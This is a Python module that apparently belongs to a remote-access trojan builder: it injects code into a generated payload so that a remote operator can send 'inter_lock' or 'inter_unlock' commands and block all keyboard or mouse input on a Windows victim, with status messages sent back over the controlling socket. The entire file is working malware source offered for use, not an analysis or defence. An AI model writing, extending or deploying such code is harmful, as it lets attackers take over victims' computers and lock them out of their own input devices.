import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('import pyWinhook')
        config.import_statements.append('import pythoncom')
        config.import_statements.append('import threading')
        config.global_objs.append('keylock = False')
        config.global_objs.append('mouselock = False')
        config.functions.append('''
def disable(event):
    return False


def enable(event):
    return True


def key_lock():
    hm = pyWinhook.HookManager()
    hm.KeyAll = disable
    hm.HookKeyboard()
    while True:
        if not keylock:
            hm = pyWinhook.HookManager()
            hm.KeyAll = enable
            hm.HookKeyboard()
            return
        pythoncom.PumpWaitingMessages()


def mouse_lock():
    hm = pyWinhook.HookManager()
    hm.MouseAll = disable
    hm.HookMouse()
    while True:
        if not mouselock:
            hm = pyWinhook.HookManager()
            hm.MouseAll = enable
            hm.HookMouse()
            return
        pythoncom.PumpWaitingMessages()


def interface_locker(data):
    global keylock
    global mouselock
    if data.split(' ')[0] == 'inter_lock' and data.split(' ')[1] == 'key' and keylock:
        send_all(s,'[-]Keyboard is already locked')
    elif data.split(' ')[0] == 'inter_lock' and data.split(' ')[1] == 'mouse' and mouselock:
        send_all(s,'[-]Mouse is already locked')
    elif data.split(' ')[0] == 'inter_lock' and data.split(' ')[1] == 'key':
        keylock = True
        t = threading.Thread(target=key_lock,args=(),)
        t.start()
        send_all(s,'[+]Locked keyboard interface')
    elif data.split(' ')[0] == 'inter_lock' and data.split(' ')[1] == 'mouse':
        mouselock = True
        t = threading.Thread(target=mouse_lock,args=(),)
        t.start()
        send_all(s,'[+]Locked mouse interface')
    elif data.split(' ')[0] == 'inter_unlock' and data.split(' ')[1] == 'key':
        keylock = False
        send_all(s,'[+]Unlocked keyboard interface')
    elif data.split(' ')[0] == 'inter_unlock' and data.split(' ')[1] == 'mouse':
        mouselock = False
        send_all(s,'[+]Unlocked mouse interface')
    else:
        send_all(s,'[-]Please specify valid interface, key/mouse, to lock/unlock')''')
        config.logics.append('''
            elif command in ('inter_lock','inter_unlock'):
                interface_locker(data)''')
        config.help_menu['inter_lock <key/mouse>'] = 'Disable the keyboard or mouse interface'
        config.help_menu['inter_unlock <key/mouse>'] = 'Enable the keyboard or mouse interface'
    elif option == 'info':
        print('\nName             : Interface locker' \
              '\nOS               : Windows' \
              '\nRequired Modules : pyWinhook (External), pythoncom (External), threading' \
              '\nCommands         : lock <key/mouse>, unlock <key/mouse> ' \
              '\nDescription      : Disable or enable the keyboard or mouse interface\n')
